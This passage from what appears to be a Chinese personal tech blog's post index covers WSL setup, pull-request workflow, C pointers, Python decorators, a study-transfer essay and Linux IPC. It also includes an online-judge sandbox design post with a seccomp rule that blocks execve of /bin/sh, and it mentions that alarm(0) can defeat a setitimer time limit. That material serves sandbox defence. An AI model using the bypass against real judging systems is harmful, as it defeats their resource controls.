一般来说，容器镜像是只有root用户的，并且只有运行操作系统必要的软件包，甚至连vi都没有 先建立一个用户 123NEW_USER=&lt;YOUR_USERNAME_HERE&gt;useradd -m -G sudo -s /bin/bash &quot;$NEW_USER&quot;passwd &quot;$NEW_USER&quot; 下面安装一下vim和sudo，然后使用visudo快速打开配置文件 123apt install vimapt install sudovisudo 在最下面追加内容，保存即可 1&lt;USERNAME_HERE&gt; ALL=(ALL:ALL) NOPASSWD: ALL 设置用户为 WSL 默认启动用户向/etc/wsl.conf写入如下内容 12[user]default=${NEW_USER} 也可以使用tee写入 1234tee /etc/wsl.conf &lt;&lt;_EOF[user]default=${NEW_USER}_EOF 更改在 Windows Terminal 的标签名在Windows Terminal中，Ubuntu 实例的 Tab 名格式是user@machine:path，如果实例比较多的话根本分不清楚 好在你有办法避免这种情况，你可以根据这篇文档进行操作：Windows Terminal Tab Title Setup | Microsoft Docs 简单说，向.bashrc写入如下内容： 12export PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ 'echo -ne '\\033]0;&lt;YOUR_TITLE_HERE&gt;\\a'","link":"/2022/05/21/%E5%9C%A8WSL2%E4%B8%AD%E5%AE%89%E8%A3%85%E4%BB%BB%E6%84%8FLinux%E5%8F%91%E8%A1%8C%E7%89%88/"},{"title":"如何向开源项目提交PR","text":"我在前段时间给 Caddy 和 GitHub CLI 分别提交了一个 PR 并被 Merge，初次体验了参与开源社区贡献的流程，本文我将总结一些经验。 总览本文假设读者有一定的 Git 基础 当你觉得项目需要改进时： 修复 BUG 增加功能 完善文档 或者其他合理修改目的 你可以在 GitHub 向项目发起 Pull Request 来申请项目合并你修改过的部分。 有一定规模的开源项目都会有完整的贡献流程，你可以在项目中找到CONTRIBUTING.md之类的文件，详细阅读其贡献要求。 对于大多数项目来说，提交 PR 无非如下几步： Fork 该项目 在你的 Fork 中新开一个分支 在新分支中进行修改 向原项目发起 Pull Request 当然，实际操作流程会根据不同项目变化，比如有的项目会要求提交的 PR 一定要有对应的 Issue，那么在必要的情况下我们需要先开一个 Issue 再发起 PR 发现问题你需要先有一个问题，然后才能解决问题 一般来说，问题来源有两种方式： 自己在使用的过程中发现 BUG 或者需要改进的地方 在仓库的 Issues 中浏览，寻找自己可以解决的问题 对于第一种情况，发现问题后需要反复测试，确保可复现，并上报官方仓库，在 Issue 中讨论，并表示自己可以尝试解决该问题 对于第二种情况，大部分仓库都会对 Issue 打标签，你可以使用help wanted, pr welcome等标签过滤，帮助你快速找到 Issue 解决问题修改代码毫无疑问的是，你需要先 Fork 原来的仓库。 对于大部分情况，我的建议是将 Fork 后的仓库 Clone 到本地，或者在 Code Spaces 中修改。如果你的修改粒度很小，比如修正拼写等，那你可以在网页中直接进行操作。 在本地操作的过程： git clone git checkout -b &lt;your-branch-name 使用自己喜欢的编辑器修改代码 如果你的修改量特别大，建议拆分为多个 commit 以增加可阅读性 通过测试写完的代码当然要先测试通过了再推送咯。 一般来说，项目的测试流程会通过贡献文档说明，按照其描述来即可完成本地测试。 许多开源项目已经配置了 GitHub Actions CI/CD 流程，只要你将代码推送到个人 Fork 仓库，并且确保仓库的 Actions 是开启状态，那么就可以通过 GitHub Actions 来进行自动化测试，你只需要等结果就好了。 推送代码到个人 Fork使用git push即可将完成的修改推送到 GitHub。 发起 Pull Request 推荐在 Issue/Pull Request 中使用 #ID 的形式进行相互引用 Linking a pull request to an issue - GitHub Docs 现在，你可以准备发起一次 Pull Request。 有的项目建议发起 Issue，随后再发起 PR。例如我在 Caddy 中的一次贡献，我首先发起了PR，随后发起 Issue （其实我搞反了，不过没人在这种事情上较真，对吧？）。 有的项目，你可以直接发起 PR，如果有，则最好链接到相关的 Issue，比如我在 cli/cli 中的 这个 PR。 在你发完之后，就可以等待相关人员对你的 PR 进行回应了。 Review如果你的 PR 是合理的，将会有一个或者多个人对你的代码进行 Review。 如果所有 Reviewer 都 Approve 了你的代码，那么不久后将进行 Merge 操作。 当然，如果 Reviewer 对你的代码有问题，他们会在对应代码下进行留言讨论，如果他们觉得你的代码需要修改，就会发起一次修改请求，详见下节 Requested changes现在，你需要根据要求修改你的代码。 正确的流程是： 直接打开本地 Fork 仓库，在之前的分支上继续进行修改 使用git push推送到远程 Fork 仓库 在这一系列操作之后，你可以查看你的 Pull Request 页面，它已经根据你的操作，自动修改了 PR 中的提交内容。 也就是说，一次 PR 是以两个分支之间的差异为单位的，你可以任意增加 Commit，也可以删除(会显示为 Outdated，但是已经在 GitHub 保存)，所以要熟悉运用git rebase进行操作。 你可以看看 这个 PR， 我在被要求更改之后，一通操作删除了之前被评论的 Commit，并且新增了一些 Commits。 Merge如果所有 Reviewer 都 Approve 你的代码，那么你的代码就会被 手动/自动/推迟计划到某个版本 进行 Merge，这取决于不同仓库的配置和规划。比如我的第一个 PR 是被手动 Merge 的，而第二个是在所有 Reviewer 审核 Approved 之后，由机器人自动 Merge。 结束以上就是常见的 Pull Request 流程，希望对你有所帮助。","link":"/2022/11/11/%E5%A6%82%E4%BD%95%E5%90%91%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8F%90%E4%BA%A4PR/"},{"title":"如何设计一个安全沙盒","text":"在 OJ 中，沙盒是必不可少的一环，服务器无法相信用户提交的代码，这可能导致很多安全问题。 总体上来说，沙盒需要做到两点： 对系统调用进行限制 对资源使用进行限制 系统调用限制一般来说，系统调用的拦截有两种办法： ptrace(2) seccomp(2) ptrace这是一种开销较大的方法，拦截tracee的系统调用的开始和结束，两次切换用户态和内核态。 GDB 的基本调试功能就是这么实现的，不过对于一个追求执行速度的沙盒来说，这个方法不可取。 seccompSecure computing，自 Kernel 2.6.12 引入，这是一种内核态下的过滤机制，最初限制程序只能用四个系统调用，用于运行低权限应用 1read，write，_exit，sigreturn 要对所有系统调用进行拦截，要用到的是是Seccomp-BPF，自 Kernel 3.5 引入，BPF最初是一种网络封包过滤代理，此后被广泛运用，包括这里。 由于其本质上是运行在内核的一个虚拟机，所以需要编写字节码，略微麻烦，所以有libseccomp去帮助人们方便快捷地编写规则 下面是使用libseccomp的一个例子，实现了对execve的禁用 123456789101112131415161718192021#include &lt;unistd.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;int main(void){ // filter context scmp_filter_ctx ctx; // using whitelist ctx = seccomp_init(SCMP_ACT_ALLOW); // send SIGSYS when this program is calling execve seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0); // load filter seccomp_load(ctx); // Let's give it a try char * str = &quot;/bin/sh&quot;; write(1,&quot;hello worldn&quot;,12); // 59 is syscall number of execve // The program will receive SIGKILL after calling syscall(59,str,NULL,NULL); return 0;} 接下来介绍一些对特定语言的设置 C/CPP对于 C 和 CPP 这种较为底层的语言，通常使用白名单，对权限进行严格管控 Java/Python对于带有虚拟机/解释器的语言，通常使用黑名单模式，避免出现错杀情况 一些特殊情况有时候需要根据沙盒实现进行特殊限制，比如沙盒使用setitimer时，alarm(0);可以直接取消设定好的计时器，从而破坏沙盒功能 系统资源限制时间程序的时间可以分为两部分： CPU 时间 实际运行时间 由于操作系统的调度，程序主动sleep，阻塞 I/O 等情况，程序的实际运行时间要大于 CPU 时间 setrlimit这个调用可以实现对多种资源的限制，对于时间，它只能限制 CPU 时间 RLIMIT_CPU 这个只能精确到秒，可以用但是不建议 RLIMIT_RTTIME 可以精确到微妙，但是只能在特定的调度模式下使用，比较复杂，未使用 setitimer此调用可以限制 CPU 时间和实际时间 ITIMER_REAL decrements in real time, and delivers SIGALRM upon expiration. ITIMER_VIRTUAL decrements only when the process is executing, and delivers SIGVTALRM upon expiration. ITIMER_PROF decrements both when the process executes and when the system is executing on behalf of the process. Coupled with ITIMER_VIRTUAL, this timer is usually used to profile the time spent by the application in user and kernel space. SIGPROF is delivered upon expiration. 计算 CPU 时间时，一般不算入内核态时间，所以使用ITIMER_VIRTUAL 内存这是一个很麻烦的地方，setrlimit给了两个相关资源 RLIMIT_AS 虚拟内存大小 RLIMIT_RSS Resident Set Size，常驻内存大小 一般来说，只能限制虚拟内存大小，RSS 不能作为可靠观测指标 一般情况下进程虚拟内存的大小都明显大于实际使用的物理内存，所以需要在限制时给出一个大于目标值的参数，如两倍大小的给定内存数 What is RSS and VSZ in Linux memory management - Stack Overflow 栈内存使用setrlimit,RLIMIT_STACK 可以这样限制，但是需要特别的方式进行判断，详见 man page 输出大小这里是指The maximum size of files that the process may create. 所以，这里用来限制重定向 STDOUT 到文件后的输出 使用setrlimit，RLIMIT_NPROC 线程数量使用setrlimit，RLIMIT_NPROC 其他一些细节Guest 环境变量由于沙盒是通过execve实现的，所以给 Guest 传递什么变量就需要考虑一下 环境变量可以通过编译器提供的外部变量获取 12345678910#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;extern char **environ;int main(){ // print the environment variables for (int i = 0; environ[i] != NULL; i++) printf(&quot;%s\\n&quot;, environ[i]);} 通过在力扣等多个网站测试，只提供最基本的PATH应该是 OK 的 1PATH=/usr/local/bin:/usr/bin:/bin Guest 的 argv[0]根据标准，它应该是一个 可以代表程序的名字 所以这里完全可以自定义为guest 参考","link":"/2022/10/21/%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E6%B2%99%E7%9B%92/"},{"title":"指针与多维数组","text":"缘起指针和多维数组这块有点绕，单独写个笔记 多维数组中的数组名给出一个二维数组 1234567int zippo[4][2]={ {1,3}, {2,3}, {2342,34}, {242,234}}; 有下列等式成立 12345zippo == &amp;zippo[0]zippo[0] == &amp;zippo[0][0]*zippo == &amp;zippo[0][0]**zippo == zippo[0][0] 数组名是其首元素的地址，所以前两条很容易得到 那么在加上解引用符号*，就可以得到下面的两个式子。 解引用两次才能得到原始值，这被称为双重间接 指向多维数组的指针12int (*pz)[2];int * pax[2]; 考虑一下，有什么区别？ pz指向一个内含两个 int 类型值的数组，是一个指针 pax是一个内含两个指针的数组，每个元素都是指向 int 类型型的指针 为什么? 由于()的存在，pz 首先与*结合，因此声明的是一个指向数组(内含两个 int 型元素)的指针 由于[]优先级更高，先与 pax 结合，从而声明了一个数组，随后*又表示数组内的元素是指针 举个例子 123456789101112#include &lt;stdio.h&gt;int main(void){ int a[3][5] = { {1, 2, 3, 4, 5}, {6, 7, 8, 9, 10}, {11, 12, 13, 14, 15} }; int (*p)[5] = a; printf(&quot;%d&quot;,**p);} 例中声明一个p指针，指向一个包含 5 个元素的数组，并在初始化时指向二维数组中的第一个数组(数组名就是首元素地址) 此时p值为{1,2,3,4,5}的地址 第一次解引用的对象是指针p，也就是{1,2,3,4,5}的地址，得到了其值(1`的地址) 第二次解引用的对象指针{1,2,3,4,5}，也就是是1的地址，得到了其值，即为1 一般而言，指向多维数组的指针如下进行声明 12345678910111213141516171819#include &lt;stdio.h&gt;int main(void){ int array[1][2][3][4][5]; array[0][0][0][0][0] = 1234; array[0][0][0][0][1] = 12345; int(*p1)[2][3][4][5] = array; // 指向五维数组 array 也就是指向array[0]的地址 int(*p2)[3][4][5] = array[0]; // 指向四维数组 array[0] 也就是指向array[0][0]的地址 int(*p3)[4][5] = array[0][0]; // 指向三维数组 array[0][0] 也就是指向array[0][0][0]的地址 int(*p4)[5] = array[0][0][0]; // 指向二维数组 array[0][0][0] 也就是指向array[0][0][0][0]的地址 int(*p5) = array[0][0][0][0]; // 指向一维数组 array[0][0][0][0] 也就是指向array[0][0][0][0][0]的地址 printf(&quot;%d %d %d %d %d\\n&quot;,*****(p1),****p2,***p3,**p4,*p5); printf(&quot;%d %d %d %d %d&quot;,*(****p1+1),*(***p2+1),*(**p3+1),*(*p4+1),*(p5+1)); /* 1234 1234 1234 1234 1234 12345 12345 12345 12345 12345 */} 如果是作为函数的形参，则有两种写法 12int func( int (*p1)[2][3][4][5] ) // 需要传入一个指向五维数组的指针int func( int [][2][3][4][5] ); // 等效写法","link":"/2020/07/26/%E6%8C%87%E9%92%88%E4%B8%8E%E5%A4%9A%E7%BB%B4%E6%95%B0%E7%BB%84/"},{"title":"理解Python中的Decorator","text":"前言之前看廖雪峰老师的 Python 教程的时候卡在装饰器那一节，干脆跳了过去。 现在看到@property的使用，又涉及到了装饰器的相关知识，于是只好回头来好好学一下了。。。 在了解装饰器之前，建议先了解一下什么是闭包 什么是装饰器定义装饰器本质上是一个 Python 函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。 它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。 概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 基础装饰器这里使用两个实际例子来说明一下最基础的装饰器 日志打印123456789101112131415161718#Decoratordef logger(func): def wrapper(*args, **kw): print('Start function: {} '.format(func.__name__)) func(*args, **kw) #The function print('End') return wrapper@loggerdef add(x, y): print('{} + {} = {}'.format(x, y, x+y))add(2,3)#outupt:#Start function: add #2 + 3 = 5#End 计时器计算一个函数的执行时长 1234567891011121314151617181920#Decoratorimport timedef timer(func): def wrapper(*args, **kw): start = time.time() time.sleep(1) # Time spent is too short without a sleep func(*args, **kw) end = time.time() cost_time = end - start print(&quot;Time spent：{}&quot;.format(cost_time)) return wrapper@timer def add(x, y): print('{} + {} = {}'.format(x, y, x+y))add(2,3)#output:#2 + 3 = 5#Time spent：1.000917673110962 拿计时器这个例子来说 把@timer放到了add函数的定义，它就像一顶帽子一样戴在这个函数的头上。和这个函数绑定在一起。在我们调用这个函数的时候，第一件事并不是执行这个函数，而是将这个函数做为参数传入它头顶上这顶帽子，这顶帽子我们称之为装饰函数 或 装饰器。 其实我们做到了这样一个实现: 123456789101112131415161718192021import timedef timer(func): def wrapper(*args, **kw): start = time.time() time.sleep(1) # Time spent is too short without a sleep func(*args, **kw) end = time.time() cost_time = end - start print(&quot;Time spent：{}&quot;.format(cost_time)) return wrapper def add(x, y): print('{} + {} = {}'.format(x, y, x+y))timer(add)(2,3)#output:#2 + 3 = 5#Time spent：1.000917673110962#一般而言，函数后面只有一个括号。如果看见括号后还有一个括号，说明第一个函数返回了一个函数，如果后面还有括号，说明前面那个也返回了一个函数。以此类推。 timer(add)返回了一个wrapper (*args, **kw) 函数，所以又加了一个(2,3)传入wrapper内供func()调用，这里的func()其实也就是add() 带参数的装饰器如果要让装饰器带参数，那么需要两层的嵌套 打招呼1234567891011121314151617181920212223242526272829#Parametric decoratordef say_hello(country): def wrapper(func): def deco(*args, **kwargs): if country == &quot;china&quot;: print(&quot;你好!&quot;) elif country == &quot;america&quot;: print('hello.') func(*args, **kwargs) return deco return wrapper@say_hello(&quot;china&quot;)def american(name): print(&quot;我来自中国，我叫&quot; + name)@say_hello(&quot;america&quot;)def chinese(name): print(&quot;I am from America, and my name is &quot; + name) american('张三')chinese('Alan')#output:#你好!# 我来自中国，我叫张三# hello.# I am from America, and my name is Alan 更高级的日志打印我们现在要给每条日志加上level ，就像这样 12[DEBUG] Log1[WARN] Log2 1234567891011121314151617181920#Parametric decoratordef logger(level): def wrapper(func): def inner_wrapper(*args, **kw): print(f'[{level}] Start function {func.__name__}') func(*args, **kw) print(f'[{level}] End function {func.__name__}') return inner_wrapper return wrapper@logger(level='DEBUG')def add(x, y): print('{} + {} = {}'.format(x, y, x+y))add(2,3)#output:#[DEBUG] Start function add#2 + 3 = 5#[DEBUG] End function add @functools.wraps(）在刚才的计时器例子中，如果你留心注意 12&gt;&gt;&gt; add.__name__'wrapper' 举个例子来看 123456789101112131415161718192021#Decoratorimport timedef timer(func): def wrapper(*args, **kw): start = time.time() func(*args, **kw) end = time.time() cost_time = end - start print(&quot;Func:{1} Time spent：{0}&quot;.format(cost_time, func.__name__)) return wrapper@timer def add(x, y): print('{} + {} = {}'.format(x, y, x+y)) print(add.__name__) #在add函数体中打印函数名add(2,3)#output:#2 + 3 = 5#wrapper#Func:add Time spent：0.0 这里我们打印了两次函数名，但是却出现了不同的结果。为什么？ 我们使用装饰器后， 1add = timer(add) 而timer函数返回的就是wrapper, 这样子的话其实就是 1add = wrapper 那么add的 name 自然就是wrapper的 name，所以出现了第二行的输出结果 我们执行add(2,3)的时候，add函数被作为func传入timer函数中，所以func.__name__ 就是add.__name__ ，所以输出的第三行就是add 不仅仅是__name__, 其他的属性也会随之改变。 如何避免？ 使用functools.wraps 1234567891011121314151617181920212223#Decoratorimport functoolsimport timedef timer(func): @functools.wraps(func) def wrapper(*args, **kw): start = time.time() func(*args, **kw) end = time.time() cost_time = end - start print(&quot;Func:{1} Time spent：{0}&quot;.format(cost_time, func.__name__)) return wrapper@timer def add(x, y): print('{} + {} = {}'.format(x, y, x+y)) print(add.__name__)add(2,3)#output:#2 + 3 = 5#add#Func:add Time spent：0.0 先更到这里吧…类装饰器之类的后续再更 参考文章 详解 Python 的装饰器 Toby Qin https://www.cnblogs.com/cicaday/p/python-decorator.html 一篇文章搞懂装饰器所有用法 Ellison 张 https://www.cnblogs.com/ellisonzhang/p/11196390.html 对 python 函数后面有多个括号的理解？Python 探索牛 https://www.cnblogs.com/djdjdj123/p/12063737.html 装饰器 廖雪峰 https://www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584","link":"/2020/06/05/%E7%90%86%E8%A7%A3Python%E4%B8%AD%E7%9A%84Decorator/"},{"title":"记一次转专业","text":"写在开头TL; DR - 我终于在大二之前的暑假转到了计科院，软工专业，也算是满了一个小小的愿望。 毕竟是平级转，接下来的这些日子会很难走了，暑假先补高数和大物吧。 刚考了科目三回来又是面试，面试完了又该学了。 艰难的转专业之路志愿填报19 年考完填报志愿的时候是5*6模式，5 个学校，30 个专业 清楚地记得，第一个汕头大学，首年在河北招生就要了 569 的分数，没赌到 第二个桂林电子科技大学，也是 569，相对之前的分数也是突然上升了不少，没得上 第三个就是长江大学了，当时犹豫在外语类和计算机类中间，谁放前面？最后我把外语放在了前面，然后进了外国语学院 为什么要转虽然自己的英语成绩算比较好，高考也拿了个差不多的 139，但是学了一年的英语之后，我逐渐感觉自己不太适合去学英语，即使我可以学好。 因为这种心理，第一个学期也没怎么上心地去学，GPA 也很拉，又加剧了这种心理落差，更想转出去了。 几经周折我本来想在 2020 春，也就是大一下学期开学的时候递交自己的转专业申请，但是突如其来的疫情直接让本次转专业工作取消了(还有我的科目三考试)，当时真的挺难受的。 后来马上又开始上网课，我也没想啥，继续学吧。 第二学期的 GPA 是3.72，比第一学期好点了。 结课之后我就几乎每天在翻计科院首页，等转专业的工作安排，刷了好几天刷到 6.20 左右终于等到了，一打开看条件，变化了不少，看来看去我都挺符合的，除了要求学习过高等数学A/B。 当时挺难受的，因为外院只在第一学期安排了同济的大学文科数学，也就是高数 D，不符合要求。 不过后来想想还是把申请表投给了外院，我希望能通过自己的一些东西证明我有一些本事，不是一拍脑袋就来这里的，虽然以后的我看到这些材料可能会笑掉大牙。。。 没想到我通过了外院和教务处的双层审核，但是当时我也没什么心思了，因为硬性要求不符合，后续的面试可能也只是程序上的必要过程，但是我想了一下还是做了个简单的准备。 面试我写这篇随笔的当天下午，是我的面试时间 我按照Material Design的风格做了个自我介绍 PPT，简单说明了我自己的学习和生活情况。我承认也在里面掉了掉书袋，虽然我自己不太喜欢这样，但是这不是装什么也不知道的时候。 于是计科院的面试领导当时就针对我的 PPT 里一个点问了我个问题 你说你刷过机，是手机吗？你能简单讲一下你对这个过程的理解吗 当时我也挺难回答的，刷机一般来说都是形容手机的刷写，但是我就做了一个不太好的回答 啊，刷机的话，手机路由和电脑都有。就拿电脑做个例子，我需要从 Windows 转到 Linux, 假设我要用 Ubuntu，那么我就去下载 Ubuntu 的一个安装程序，它可以实现向硬盘拷贝 Linux 内核和一些其他的东西，还有引导程序，并通过这么一个引导程序去启动系统。 现在想想真是问题挺多。。老师问的模糊，我答的更模糊。 我忘了GRUB怎么读，于是也没说出来这个东西。。也没有提到更加底层的BootLoader, BIOS，如果当时拿普通的安卓机去举例，可以答得好一些。 这个问题问完之后，老师们对我的评价是 你有不错的感性认知，但是理论只是是很重要的，实践得来的经验不是一切(大概是这意思) 确实，这也是我来这里的原因之一，我需要系统化的学习理论。 不过当时我没这么说，只是赞同老师的说法，并且提及自己也有在读《计算机科学概论》，我也认同理论知识的重要性。 后面的问题就比较偏向其他方面 平时运动吗？人际关系处理如何？除了学计算机还爱干啥？ 肯定要运动 我是个慢热的人，对人对事都是这样。如果不是主动或者必要，我大概率不做某件事/不叫朋友。但是我也不是那种沉默寡言的人，我是班里的团副，是学生会成员，是志愿者协会干事，我组织过不少东西，交流也是常有的。 还干啥。。听听歌，看电影，写点笔记。当时忘了说的一个，还有和朋友打打游戏。 然后就结束了，感觉还好吧。 后面根据老师的通知，我选择了不服从调剂，我明白为什么选择软工，也明白后果。 面试结果退出去的第一感觉是，我好像有戏？ 但其实自己当时还是不太确定，心里就想着，能进多吃苦努努力跟上高数大物，进不去继续自学 睡了一觉到七点半，群里说名单在网站公布了。说实在的，还是有点小激动。 打开计科院首页，点开第一个公告，CTRL+F，打上自己的名字，出现了1/1的时候，心里算是稳下来了。 没啥好说的，恶补一下落下的数学和物理吧，加油。 结尾GitHub 的Hoping for a major change状态可以去掉了。 既然已经选择这条路，那就走下去。","link":"/2020/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E4%B8%93%E4%B8%9A/"},{"title":"进程间的通讯方式","text":"简介在 Linux 中有许多种方式允许进程之间进行通讯(Inter-process communication) 由于历史原因，Linux 内核提供System V和POSIX两种实现，两者概念十分相似。尽管如此，仍然推荐使用POSIX实现，因为接口的规范和统一性更好 这些 IPC 方法可以按照如下方式分类（完整列表请看参考中的 Presentation)： 通讯 Communication 数据传输 Data transfer 字节流 Byte stream 匿名管道 Pipe 命名管道 FIFO 流式套接字 Steam socket 消息 Message SystemV Message queue POSIX Messag queue 数据报套接字 Datagram socket 共享内存 Shared memory SystemV shmem POSIX shmem 内存映射 Memory mapping 匿名 Anonymous 文件映射 File mapping 同步 Synchronization 信号量 Semaphore SystemV semaphore POSIX semaphore 信号 Singal 实时信号 Realtime 标准信号 Standard 匿名管道 Pipe平时在 Shell 中经常用到，使用方法就是在命令间使用|连接 它的作用是把前一个命令的输出作为后一个命令的输入 比如在搜索时就会经常用到： 12Cywair@Cywair-mach:/$ cat var/log/syslog.1 |grep &quot;cron&quot;May 24 00:17:01 Cywair-mach CRON[585699]: (root) CMD ( cd / &amp;&amp; run-parts --report /etc/cron.hourly) 12bakaft@BakaFT-PC:~$ ls -al | grep &quot;socket&quot;drwxrwxr-x 9 bakaft bakaft 4096 May 23 12:05 socket-programming 实现在 Xv6 的学习过程中实现过 6.828-Hw2-Shell - BakaFT’s blog 简单来说： 使用pipe()创建管道（p[0]指向 Write 端，p[1]指向 Read 端） 使用fork()创建两个子进程（子进程继承了父进程的管道描述符） 第一个子进程运行左程序，并且使用dup2()将stdout指向管道的 Write 端 第二个子进程运行右程序，并且使用dup2()将stdin指向管道的 Read 端 关闭非必要的文件描述符，避免阻塞现象 特点 随进程持续 不存在于文件系统中，直接与内核内存中的缓冲区连通 存在阻塞现象： 读管道时，管道为空，Write 端存在引用，则会阻塞 写管道时，管道已满，Read 端存在引用，则会阻塞 缺点 半双工通信，只能从 Write 端到 Read 端 只能做到亲缘关系进程之间的通讯 容量小，满了再写就要阻塞 Linux 2.6.11 前，容量为 4096 字节 Linux 2.6.11 后，容量为 65535 字节 Linux 2.6.35 后，使用fcntl(fd, F_SETPIPE_SZ, size)可以自行调节，但不具有移植性 这里补充一下，最高值由/proc/sys/fs/pipe−max−size限定 命名管道 Named pipe (FIFO)顾名思义，这个管道是有名字的 打开两个终端，进行如下操作，即可看到效果 创建管道并查看内容，这个管道会以文件形式存在 12345678bakaft@BakaFT-PC:~$ tty/dev/pts/1bakaft@BakaFT-PC:~$ mkfifo named-pipebakaft@BakaFT-PC:~$ ls -al named-pipeprw-r--r-- 1 bakaft bakaft 0 May 25 14:53 named-pipebakaft@BakaFT-PC:~$ cat named-pipeHi there, I've redirected my keyboard input to this pipe.bakaft@BakaFT-PC:~$ 将键盘输入重定向到管道并输入字符串 123456bakaft@BakaFT-PC:~$ tty/dev/pts/0bakaft@BakaFT-PC:~$ cat&gt;named-pipeHi there, I've redirected my keyboard input to this pipe.^Cbakaft@BakaFT-PC:~$ 另外，还可以在 C 中调用mkfifo(3)实现 12#include &lt;sys/stat.h&gt;int mkfifo(const char *pathname, mode_t mode); 特点 随进程持续 全双工通信 以文件形式存在 可以做到无关程序之间的通讯 遵循 FIFO 原则，从头开始读，从尾开始写 缺点 存在与匿名管道一样的阻塞现象（但是你可以在 C 调用时通过mode参数改为非阻塞模式，具体看 man page） 消息队列 Message queue特点 随内核持续 System V MQ消息队列本质上是位于内核空间的链表，链表的每个节点都是一条消息 每一条消息都有自己的消息类型，消息类型用整数来表示，而且必须大于 0。每种类型的消息都被对应的链表所维护： 特别的是，消息类型为 0 的链表按照加入队列的顺序记录了所有消息 POSIX MQ与 System V MQ 类似，但是 相比前者是用整数，它使用/somename的形式标记 存在一个通知机制 消息队列存在于一个虚拟文件系统 123456bakaft@BakaFT-PC:/$ mkdir /dev/mqueuebakaft@BakaFT-PC:/$ mount -t mqueue none /dev/mqueuebakaft@BakaFT-PC:/dev/mqueue$ lstest-queuebakaft@BakaFT-PC:/dev/mqueue$ cat test-queue QSIZE:0 NOTIFY:0 SIGNO:0 NOTIFY_PID:0 通知机制应用程序可以注册到某个队列来收取通知 当消息到达之前为空队列时，会被通知 可以选择通知方式 发送一个 Signal 启动一个新的线程 需要注意 任意时刻只能有一个进程能够向某个消息队列 注册接收通知 在注册进程收到了一条通知后，注册信息失效 如果其他程序正在接收通知，注册进程就不会收到通知 通过指定notification参数为NULL来取消注册 特点 面向消息通讯 消息具有优先级 具有消息通知机制 存在引用计数，只有当所有使用队列的进程全部关闭才会标记删除 缺点 严格按照优先级，但丢失了像 System V MQ 消息分类的灵活性 共享内存 Shared memory进程之间共享同样的物理内存页面，他们的“通讯”就是在内存中交换数据 特点 随内核持续 效率高 直接在用户内存空间共享，而非 用户内存 A=&gt;内核内存=&gt;用户内存 B 这样的交换 缺点 需要注意同步 mmap 介绍接下来的三种内存共享方式均需要用到 mmap(2) - Linux manual page (man7.org) 12void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); 关于 mmap 的部分 flag: MAP_SHARED表示对映射区域的修改会写回文件，并且在进程之间共享 尽管会写回，但是需要尽量调用msync()保证写回一定会执行 MAP_PRIVATE表示既不写回，也不在进程之间共享，这是一种实现malloc的思路，但是下面不会用到 匿名共享映射 Shared anonymous mappings1int* addr = mmap(NULL,0x64,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0); 特点 适用于亲缘进程 不需要文件系统支持 mmap() 中的fd和offset是不需要的，但是出于移植性考虑建议赋值为-1和0 12345678MAP_ANONYMOUSThe mapping is not backed by any file; its contents areinitialized to zero. The fd argument is ignored; however,some implementations require fd to be -1 if MAP_ANONYMOUS(or MAP_ANON) is specified, and portable applicationsshould ensure this. The offset argument should be zero.The use of MAP_ANONYMOUS in conjunction with MAP_SHARED issupported on Linux only since kernel 2.4. 父子进程共享addr:length之间的内存 文件共享映射 Shared file mappings 特点 适用于非亲缘进程，需要文件系统支持 内存内容从文件初始化 所有共享同一个文件的进程共享同一块内存 POSIX 共享内存 POSIX shared memory特点 适用于非亲缘进程，不需要传统文件系统支持 避免 I/O 开销 存在于一个虚拟文件系统(tmpfs 类型) 1234bakaft@BakaFT-PC:/dev/shm$ lstest-shmbakaft@BakaFT-PC:/dev/shm$ cat test-shm This is a string shared between using POSIX shared memory 信号量 SemaphorePOSIX SemaphoreSemaphore 是由内核维护的整数，代表了一种共享资源的剩余数量，当值为 0 时再申请，会发生阻塞并将值下降到负数 两个基本操作 sem_post(): 增加 1 sem_wait(): 减少 1 可能会由于资源缺少而阻塞 常用于：布尔值的表示 单一资源（如共享内存是否正在被使用） 匿名信号量 unnamed semaphore 随进程持续 使用sem_init()初始化 通常把它放到共享内存中实现跨进程状态保存 命名信号量 named semaphnore 随内核持续 使用sem_open()初始化，具有/somename类型的名字 这个somename的长度被限定为NAME_MAX-4，这和它在文件系统的文件名格式有关 命名信号量存在于一个虚拟文件系统(tmpfs 类型)，以sem.somename的形式存在 （为什么要和共享内存在一个文件夹呢？） 12bakaft@BakaFT-PC:/dev/shm$ lssem.reader sem.writer 套接字 Socket一个典型的套接字 fd = socket(domain,type,protocol) 特点 随进程持续 双向通信 基于更高的层次实现 域 Domain Unix domain(AF_UNIX) 用于主机内部通讯 地址为文件路径 IPv4 domain(AF_INET) 在 IPv4 网络间通讯 地址是 32 位 IPv4 地址+端口 IPv6 domain(AF_INET6) 在 IPv6 网络间通讯 地址是 128 位 IPv6 地址+端口 类型 Type在所有的 Domain 中，有两种主要的可用 Type： 流式传输 Stream(SOCK_STREAM) 数据报传输 Datagram(SOCK_DGRAM) 在 Unix domain 中，额外还有： 顺序报文传输(SOCK_SEQPACKET) 通常配合 IPPROTO_SCTP 使用 流式套接字 Steam socket 类型使用SOCK_STREAM 字节流传输 面向连接 可靠，数据按顺序且不重复地到达或者全部不到达 在 Internet 域上使用 TCP 协议 数据报套接字 Datagram socket 类型使用SOCK_DGRAM 面向消息 无连接 不可靠： 可能包会重复 可能乱序 可能根本收不到 在 Internet 域使用 UDP 协议 顺序报文套接字 Sequential packet socket 类型使用SOCK_SEQPACKET 处于流式套接字和数据报套接字之间 面向消息 面向连接 可靠 在 Unix 域，只能使用 SCTP 协议 